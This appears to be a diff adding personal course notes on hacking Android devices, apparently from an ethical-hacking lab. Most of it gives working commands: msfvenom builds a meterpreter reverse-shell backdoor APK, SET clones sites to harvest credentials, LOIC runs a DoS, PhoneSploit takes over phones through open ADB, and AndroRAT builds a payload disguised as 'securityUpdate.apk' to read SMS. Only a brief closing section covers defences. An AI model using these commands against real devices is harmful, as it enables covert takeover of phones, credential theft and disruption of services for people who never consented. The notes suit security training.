@@ -1,0 +1,76 @@
+Hacking Mobile Platforms
+	1. Attack android devices
+		○ Hack an Android device by creating binary payloads using metasploit
+			§ Using metasploit to creaate binary payloads to gain control of a use's phone
+				$service postgresql start
+				$msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk
+				Share the backdoor file with the host. Start up meterpeter
+					>use exploit/multi/handler
+					>set payload android/meterpreter/reverse_tcp and press Enter.
+					>set LHOST 10.10.1.13
+					>exploit -j -z
+				Open the program on the client
+				Back on the meterpreter select session 1 and your in!
+			
+		○ Harvest users’ credentials using the Social-Engineer Toolkit
+			$cd setoolkit
+			$./setoolkit
+				~select the following pattern:  1~ for social engineenring attack> 2~ for website attack vectors> 3~ Credentials harvester Attack>2 ~site cloner
+				~type the local IP (the attacker)
+				~type the target URL(destination URL)
+				
+		○  DoS  Low Orbit Ion Cannon (LOIC) attack from  Android
+			 LOIC performs a DoS attack (or when used by multiple individuals, a DDoS attack) on a target site by flooding the server with TCP or UDP packets with the intention of disrupting the service of a particular host. People have used LOIC to join voluntary botnets.
+			Launch LOIC from andriod, 
+			Set the IP as http://<IP> and click manual IP, select TCP, port 80, thread 80
+			
+		○ hack the Android platform through ADB using PhoneSploit
+			§ Android Debug Bridge (ADB) is a versatile command-line tool that lets you communicate with a device. 
+			§ ADB facilitates a variety of device actions such as installing and debugging apps, and provides access to a Unix shell that you can use to run several different commands on a device.
+			developers connect to ADB on Android devices by using a USB cable, but it is also possible to do so wirelessly by enabling a daemon server at TCP port 5555 on the device.
+			$cd PhoneSploit
+			$python3 -m pip install colorama
+			$python3 phonesploit.py
+				>Press 3: connect a new phone
+				Enter the Phone's IP- connects to phone on port 5555
+				>Press 4 : to access shell 
+				Find a file that you would like to download/take
+				>>exit
+				>press 7: screen shot a picture of the phone  
+				>press 14: displaying the installed apps on the target Android device
+				>press 15: to open any apps
+					>com.android.calculator2
+				>p
+					Navigates to additional tools
+				>Press 18 :shows interface 
+				>21 Netstat
+				>press 9 to download 
+	
+		○ AndroRAT:  create a apk payload 
+			§ AndroRAT is a tool designed to give control of an Android system to a remote user and to retrieve information from it
+			§ obtains the current location, sim card details, IP address and MAC address of the device.
+			
+			$cd AndroRAT
+			$python3 androRAT.py --build -i <attacker IP> -p <Lport(attacker)> -o securityUpdate.apk
+				--build	is used for building the APK
+				-I	 specifies the local IP address (here, 10.10.1.13)
+				-p	 specifies the port number (here, 4444)
+				-o	 specifies the output APK file (here, SecurityUpdate.apk)
+			$python3 andrRAT.py --shell -i 0.0.0.0 -p 4444
+				--shell	 is used for getting the interpreter
+				-I	 specifies the IP address for listening (here, 0.0.0.0)
+				-p	 specifies the port number (here, 4444)
+			Launch the app from the android phone
+			>help
+			>getMACAdress
+			>getSMS
+
+	2. Secure Devices 
+		○ online Android analyzers
+			Online Android analyzers allow you to scan Android APK packages and perform security analyses to detect vulnerabilities in particular apps.
+			Sixo Online APK Analyzer.
+			https://www.sisik.eu/apk-tool
+			Requested Permissions: When an app wants to access resources or various device capabilities, it typically must request permission from the user to do so. Some permissions are granted by the user when installing the app and some need to be confirmed later while the app is running. The requested permissions are declared in the app’s AndroidManifest.xml file.
+		
+		○ Secure Android devices from malicious apps using Malwarebytes Security
+		Malwarebytes is an antimalware mobile tool that provides protection against malware, ransomware, and other growing threats to Android devices
